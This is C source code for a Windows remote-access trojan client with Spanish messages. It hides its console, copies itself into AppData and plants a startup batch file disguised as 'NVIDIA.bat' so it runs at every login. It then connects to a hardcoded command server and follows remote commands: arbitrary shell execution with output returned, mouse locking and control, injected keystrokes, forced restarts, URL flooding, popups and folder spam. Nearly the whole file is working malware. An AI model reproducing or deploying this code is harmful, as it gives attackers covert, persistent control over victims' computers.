#include <stdio.h>
#include <winsock.h>
#include <sys/stat.h>
#include <unistd.h>
#include <libgen.h>
#include <windows.h>
#include <wingdi.h>
#include <pthread.h>

#pragma comment(lib, "ws2_32.lib")

#define RECEIVE_BUFFER_SIZE 1024
#define MAX_FOLDER_LENGTH 260
#define CMD_LENGTH 128

#define HOST "127.0.0.1"
#define PORT "1234"

#define CMD_SUCCESS "sexo"
#define CMD_FAILURE "no"

#define LOCAL_PATH_FOLDER "\\AppData\\Roaming\\PeruvianCorp"
#define LOCAL_STARTUP_PATH "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
#define BATCH_STARTUP_FILENAME "NVIDIA.bat"

unsigned int mouse_locked = 0;

struct multiurl
{
    int ms;
    size_t max;
    char url[1024];
} * muargs;

char *strcpy(char *dest, const char *src)
{
    size_t i;
    for (i = 0; src[i] != '\0'; i++)
        dest[i] = src[i];
    dest[i] = '\0';
    return dest;
}

void error(char *message)
{
    fprintf(stderr, "%s: %d", message, WSAGetLastError());
    exit(EXIT_FAILURE);
    return;
}

void cf(char *filename)
{
    char cmd[CMD_LENGTH];
    snprintf(cmd, sizeof(cmd), "mkdir %s", filename);
    system(cmd);
    return;
}

int gsupath(char *filename, char *cfilename)
{
    FILE *out = NULL;
    char *exe_name = basename(cfilename);
    if (out = fopen(filename, "wb"))
    {
        fprintf(out, "@echo off\nSTART /B %s%s\\%s", getenv("USERPROFILE"), LOCAL_PATH_FOLDER, exe_name);
        fclose(out);
        return 1;
    }
    else
        return 0;
}

int gexecpy(char *filename)
{
    FILE *in = NULL;
    char in_filename[MAX_FOLDER_LENGTH], out_filename[MAX_FOLDER_LENGTH], cmd[PATH_MAX];
    unsigned char buffer[1024];
    size_t n, m;
    snprintf(out_filename, sizeof out_filename, "%s%s", getenv("USERPROFILE"), LOCAL_PATH_FOLDER);
    cf(out_filename);
    snprintf(cmd, sizeof cmd, "copy %s %s%s", filename, getenv("USERPROFILE"), LOCAL_PATH_FOLDER);
    in = popen(cmd, "r");
    if (in == NULL)
        return 0;
    else
    {
        fclose(in);
        return 1;
    }
}

int existf(char *path)
{
    struct stat info;
    return stat(path, &info) != 0;
}

char *create_folders(size_t max, char foldername[MAX_FOLDER_LENGTH])
{
    FILE *fp;
    char desktop_path[PATH_MAX], cmd[PATH_MAX + CMD_LENGTH];
    snprintf(desktop_path, sizeof desktop_path, "%s\\Desktop\\", getenv("USERPROFILE"));
    for (size_t i = 0; i < max; i++)
    {
        snprintf(cmd, sizeof cmd, "mkdir %s%d%s", desktop_path, i, foldername);
        fp = popen(cmd, "r");
        if (!fp)
            return CMD_FAILURE;
        pclose(fp);
    }
    return CMD_SUCCESS;
}

char *move_mouse(int x, int y)
{
    SetCursorPos(x, y);
    return CMD_SUCCESS;
}

char *click_mouse(void)
{
    POINT c;
    GetCursorPos(&c);
    mouse_event(MOUSEEVENTF_LEFTDOWN, c.x, c.y, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, c.x, c.y, 0, 0);
    return CMD_SUCCESS;
}

char *restart(int ms)
{
    FILE *fp;
    char cmd[CMD_LENGTH];
    snprintf(cmd, sizeof cmd, "shutdown /r /t %d", ms);
    fp = popen(cmd, "r");
    if (!fp)
        return CMD_FAILURE;
    pclose(fp);
    return CMD_SUCCESS;
}

void *open_util(void *util)
{
    FILE *fp;
    fp = popen(util, "r");
    pclose(fp);
}

char *open_url(char *url)
{
    FILE *fp;
    char cmd[CMD_LENGTH];
    snprintf(cmd, sizeof cmd, "start %s", url);
    fp = popen(cmd, "r");
    if (!fp)
        return CMD_FAILURE;
    pclose(fp);
    return CMD_SUCCESS;
}

void *mouse_handler()
{
    while (1)
    {
        if (mouse_locked)
        {
            SetCursorPos(100, 100);
            Sleep(200);
        }
    }
}
void *open_multiurl(void *recvargs)
{
    struct multiurl *args = recvargs;
    char cmd[CMD_LENGTH];
    snprintf(cmd, sizeof cmd, "start %s", args->url);
    for (size_t i = 0; i < args->max; i++)
    {
        system(cmd);
        sleep(args->ms);
    }
}

char *create_file(char filename[MAX_FOLDER_LENGTH], char content[256])
{
    FILE *file;
    char path[MAX_PATH];
    snprintf(path, sizeof path, "%s\\Desktop\\%s", getenv("USERPROFILE"), filename);

    size_t i = 0;
    while (content[i] != '\0')
    {
        if (content[i] == '-')
            content[i] = ' ';
        i++;
    }

    if (file = fopen(path, "wb"))
    {
        fprintf(file, content);
        fclose(file);
        return CMD_SUCCESS;
    }
    else
        return CMD_FAILURE;
}

char *input(char str[256])
{
    size_t i = 0;
    INPUT input;
    HKL currentKBL = GetKeyboardLayout(0);
    while (str[i] != '\0')
    {
        if (str[i] == '-')
            str[i] = ' ';

        input.type = INPUT_KEYBOARD;
        input.ki.wScan = 0;
        input.ki.time = 0;
        input.ki.dwExtraInfo = 0;

        input.ki.wVk = VkKeyScanEx(str[i], currentKBL);
        input.ki.dwFlags = 0;
        SendInput(1, &input, sizeof(INPUT));

        input.ki.dwFlags = KEYEVENTF_KEYUP;
        SendInput(1, &input, sizeof(INPUT));
        i++;
    }
}

char *shortcut(int fkey, int skey)
{
    INPUT inputs[4] = {};
    ZeroMemory(inputs, sizeof inputs);
    inputs[0].type = INPUT_KEYBOARD;
    inputs[0].ki.wVk = fkey;
    inputs[1].type = INPUT_KEYBOARD;
    inputs[1].ki.wVk = skey;

    inputs[2].type = INPUT_KEYBOARD;
    inputs[2].ki.wVk = skey;
    inputs[2].ki.dwFlags = KEYEVENTF_KEYUP;

    inputs[3].type = INPUT_KEYBOARD;
    inputs[3].ki.wVk = fkey;
    inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;

    UINT send = SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));
    if (send != ARRAYSIZE(inputs))
        return CMD_FAILURE;
    else
        return CMD_SUCCESS;
}

char *simple_popup(char *message)
{
    FILE *fp;
    char cmd[CMD_LENGTH];
    size_t i = 0;
    while (message[i] != '\0')
    {
        if (message[i] == '-')
            message[i] = ' ';
        i++;
    }
    snprintf(cmd, sizeof cmd, "msg * %s", message);
    fp = popen(cmd, "r");
    if (!fp)
        return CMD_FAILURE;
    pclose(fp);
    return CMD_SUCCESS;
}

char *play_sound(int id)
{
    MessageBeep(id);
    return CMD_SUCCESS;
}

void handle_command(char command[RECEIVE_BUFFER_SIZE], char (*message)[RECEIVE_BUFFER_SIZE])
{
    char delim[3] = " ";
    char *ptr = strtok(command, delim);

    if (strstr(ptr, "folder"))
    {
        // folder 10 mimimi
        ptr = strtok(NULL, delim);
        size_t max = atoi(ptr);
        ptr = strtok(NULL, delim);
        strcpy(*message, create_folders(max, ptr));
        return;
    }
    else if (strstr(ptr, "movemouse"))
    {
        // movemouse 900 900
        int x = 0, y = 0;
        ptr = strtok(NULL, delim);
        x = atoi(ptr);
        ptr = strtok(NULL, delim);
        y = atoi(ptr);
        strcpy(*message, move_mouse(x, y));
        return;
    }
    else if (strstr(ptr, "click"))
    {
        strcpy(*message, click_mouse());
        return;
    }
    else if (strstr(ptr, "getmouse"))
    {
        POINT c;
        GetCursorPos(&c);
        snprintf(*message, sizeof *message, "%d %d", c.x, c.y);
        return;
    }
    else if (strcmp(ptr, "lockmouse\n") == 0)
    {
        if (mouse_locked == 1)
        {
            strcpy(*message, "El mouse ya esta bloqueado");
            return;
        }
        mouse_locked = 1;
        strcpy(*message, "Mouse bloqueado correctamente");
        return;
    }
    else if (strcmp(ptr, "unlockmouse\n") == 0)
    {
        if (mouse_locked == 0)
        {
            strcpy(*message, "El mouse no esta bloqueado");
            return;
        }
        mouse_locked = 0;
        strcpy(*message, "Mouse desbloqueado correctamente");
    }
    else if (strstr(ptr, "restart"))
    {
        // restart 3600
        ptr = strtok(NULL, delim);
        strcpy(*message, restart(atoi(ptr)));
        return;
    }
    else if (strstr(ptr, "csd"))
    {
        system("shutdown /a");
        strcpy(*message, CMD_SUCCESS);
        return;
    }
    else if (strstr(ptr, "openutil"))
    {
        // openutil calc
        pthread_t utilthread;
        ptr = strtok(NULL, delim);
        pthread_create(&utilthread, NULL, &open_util, (void *)ptr);
        strcpy(*message, "util ejecutado en segundo plano");
        return;
    }
    else if (strstr(ptr, "file"))
    {
        // file hola.txt todo-bien?
        char fname[MAX_FOLDER_LENGTH], path[PATH_MAX], content[256];
        ptr = strtok(NULL, delim);
        strcpy(fname, ptr);
        ptr = strtok(NULL, delim);
        strcpy(content, ptr);
        strcpy(*message, create_file(fname, content));
        return;
    }
    else if (strstr(ptr, "openurl"))
    {
        // openurl www.google.com
        ptr = strtok(NULL, delim);
        strcpy(*message, open_url(ptr));
        return;
    }
    else if (strstr(ptr, "openmultiurl"))
    {
        // openmultiurl www.google.com 15 3000
        pthread_t muthread;
        muargs = malloc(sizeof(struct multiurl) * 1);
        ptr = strtok(NULL, delim);
        strcpy(muargs->url, ptr);
        ptr = strtok(NULL, delim);
        muargs->max = atoi(ptr);
        ptr = strtok(NULL, delim);
        muargs->ms = atoi(ptr);
        pthread_create(&muthread, NULL, &open_multiurl, muargs);
        strcpy(*message, "Hilo multiurl hecho");
        return;
    }
    else if (strstr(ptr, "input"))
    {
        // input holahola
        char str[256];
        ptr = strtok(NULL, delim);
        strcpy(str, ptr);
        strcpy(*message, input(str));
        return;
    }
    else if (strstr(ptr, "shortcut"))
    {
        // shortcut 0x07 0x05
        int fkey, skey;
        ptr = strtok(NULL, delim);
        fkey = (int)strtol(ptr, NULL, 16);
        ptr = strtok(NULL, delim);
        skey = (int)strtol(ptr, NULL, 16);
        strcpy(*message, shortcut(fkey, skey));
        return;
    }
    else if (strstr(ptr, "popup"))
    {
        // popup mensaje
        ptr = strtok(NULL, delim);
        strcpy(*message, simple_popup(ptr));
        return;
    }
    else if (strstr(ptr, "sound"))
    {
        // sound 0x000007b
        int idsound;
        ptr = strtok(NULL, delim);
        idsound = (int)strtol(ptr, NULL, 16);
        strcpy(*message, play_sound(idsound));
    }
    else if (strstr(ptr, "cmd"))
    {
        ptr = strtok(NULL, delim);
        char cmd[RECEIVE_BUFFER_SIZE], buf[RECEIVE_BUFFER_SIZE], result[RECEIVE_BUFFER_SIZE];
        strcpy(cmd, ptr);
        size_t i = 0;
        while (cmd[i] != '\0')
        {
            if (cmd[i] == '-')
                cmd[i] = ' ';
            i++;
        }
        FILE *f = popen(cmd, "r");
        strcat(result, "cmdout\n");
        while (fgets(buf, sizeof(buf), f) != 0)
            strcat(result, buf);
        strcpy(*message, result);
    }
    else
        strcpy(*message, CMD_FAILURE);
    return;
}

void glsupath(char (*path)[PATH_MAX])
{
    snprintf(*path, sizeof *path, "%s%s\\%s", getenv("USERPROFILE"), LOCAL_STARTUP_PATH, BATCH_STARTUP_FILENAME);
    return;
}

int main(int argc, char *argv[])
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    
    SOCKET so;
    WSADATA wsa;
    pthread_t mousethread;
    struct sockaddr_in server;
    char *server_ip, message[RECEIVE_BUFFER_SIZE], buffer[RECEIVE_BUFFER_SIZE], supath[PATH_MAX], exepath[PATH_MAX];
    unsigned short server_port;
    int bytes_received;

    server_ip = HOST;
    server_port = atoi(PORT);

    snprintf(exepath, sizeof exepath, "%s%s", getenv("USERPROFILE"), LOCAL_PATH_FOLDER);
    glsupath(&supath);

    if (existf(supath) == 1)
    {
        puts("Generando arranque del ejecutable..");
        if (gsupath(supath, argv[0]) == 0)
            error("Error al generar el arranque del ejecutable");
    }
    else
        puts("Arranque del ejecutable  encontrado.");

    if (existf(exepath) == 1)
    {
        puts("Generando copia del ejecutable..");
        if (gexecpy(argv[0]) == 0)
            error("Error al generar la copia del ejecutable");
    }
    else
        puts("Copia del ejecutable encontrado.");

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        error("Error al iniciar WSAStartup");

    printf("Iniciando socket..\n");

    if ((so = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        error("Error al crear el socket.");

    printf("Socket creado correctamente.\n");

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_port = htons(server_port);

    if (connect(so, (struct sockaddr *)&server, sizeof server) < 0)
        error("Error al conectarse al servidor");

    printf("Conectado a %s:%d\n", server_ip, server_port);

    puts("Creando hilo del mouse..");
    pthread_create(&mousethread, NULL, &mouse_handler, NULL);

    strcpy(message, "SEXOARDIENTE");
    puts("Enviando ping al servidor..");
    send(so, message, strlen(message) + 1, 0);
    while (1)
    {
        if ((bytes_received = recv(so, buffer, RECEIVE_BUFFER_SIZE, 0)) == SOCKET_ERROR)
        {
            if (WSAGetLastError() == WSAECONNRESET)
            {
                closesocket(so);
                WSACleanup();
                pthread_cancel(mousethread);
                puts("Se ha cerrado la conexion con el servidor.");
                break;
            }
            else
            {
                closesocket(so);
                WSACleanup();
                pthread_cancel(mousethread);
                error("Fallo al recibir datos");
            }
        }

        buffer[bytes_received] = '\0';
        puts(buffer);
        handle_command(buffer, &message);
        send(so, message, strlen(message) + 1, 0);
    }
    closesocket(so);
    WSACleanup();
    return 0;
}
